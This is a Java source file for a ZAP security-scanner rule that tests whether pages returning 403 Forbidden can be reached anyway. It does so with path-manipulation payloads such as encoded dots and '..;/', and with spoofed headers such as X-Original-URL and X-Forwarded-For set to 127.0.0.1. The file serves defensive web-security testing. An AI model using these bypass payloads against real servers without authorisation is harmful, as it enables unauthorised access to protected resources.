/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2020 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.commons.httpclient.URI;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpStatusCode;

/**
 * Active scan rule which attempts various 403 bypass techniques.
 *
 * @author Aman Rawat (@theamanrawat)
 */
public class ForbiddenBypassScanRule extends AbstractAppPlugin {

    private static final String MESSAGE_PREFIX = "ascanalpha.forbiddenBypass.";
    private static final Logger LOG = Logger.getLogger(ForbiddenBypassScanRule.class);

    @Override
    public int getId() {
        return 40038;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public void scan() {
        HttpMessage message = getNewMsg();
        try {
            sendAndReceive(message);
            if (message.getResponseHeader().getStatusCode() != HttpStatusCode.FORBIDDEN) {
                return;
            }
            URI uri = message.getRequestHeader().getURI();
            String host = uri.getEscapedAuthority();
            String path = uri.getEscapedPath();
            String schema = uri.getScheme();
            if (sendPathPayloads(path, host, schema, uri)) {
                return;
            }
            if (sendHeaderPayloads(path, host, schema, uri)) {
                return;
            }

        } catch (IOException e) {
            LOG.warn(e.getMessage(), e);
        }
    }

    private boolean sendPathPayloads(String path, String host, String schema, URI uri)
            throws IOException {
        String[] pathPayloads = {
            "/%2e" + path,
            path + "/./",
            "/." + path + "/./",
            path + "%20/",
            "/%20" + path + "%20/",
            path + "..;/",
            path + "?",
            path + "??",
            "/" + path + "//",
            path + "/",
            path + "/.testus",
            path + "../app.py"
        };

        for (String pathPayload : pathPayloads) {
            HttpMessage reqWithPayload =
                    new HttpMessage(new URI(schema + "://" + host + "" + pathPayload, true));
            sendAndReceive(reqWithPayload);
            if (reqWithPayload.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
                createAlert(uri.toString(), reqWithPayload, pathPayload).raise();
                return true;
            }
        }
        return false;
    }

    private boolean sendHeaderPayloads(String path, String host, String schema, URI uri)
            throws IOException {
        String[] headerPayloads = {
            "X-Rewrite-URL: " + path,
            "X-Original-URL: " + path,
            "Referer: " + path,
            "X-Custom-IP-Authorization: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Forwarded-For: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Client-IP: 127.0.0.1",
            "X-Host: 127.0.0.1",
            "X-Forwared-Host: 127.0.0.1"
        };

        for (String header : headerPayloads) {
            String tmpUri = schema + "://" + host;

            if (header.contains("X-Rewrite-URL") || header.contains("Referer")) {
                tmpUri = tmpUri + "/anything";
            } else if (header.contains("X-Original-URL")) {
                tmpUri = tmpUri + "/";
            } else {
                tmpUri = tmpUri + path;
            }

            HttpMessage reqWithPayload = new HttpMessage(new URI(tmpUri, true));

            String[] headerPayload = header.split(":");

            reqWithPayload.getRequestHeader().setHeader(headerPayload[0], headerPayload[1]);
            sendAndReceive(reqWithPayload);

            if (reqWithPayload.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
                createAlert(uri.toString(), reqWithPayload, header).raise();
                return true;
            }
        }
        return false;
    }

    private AlertBuilder createAlert(String uri, HttpMessage message, String payload) {
        return newAlert().setOtherInfo(uri).setMessage(message).setAttack(payload);
    }

    @Override
    public int getCategory() {
        return Category.MISC;
    }

    @Override
    public String getSolution() {
        return "";
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    public List<Alert> getExampleAlerts() {
        List<Alert> alerts = new ArrayList<Alert>();
        alerts.add(createAlert("", new HttpMessage(), "").build());
        return alerts;
    }
}
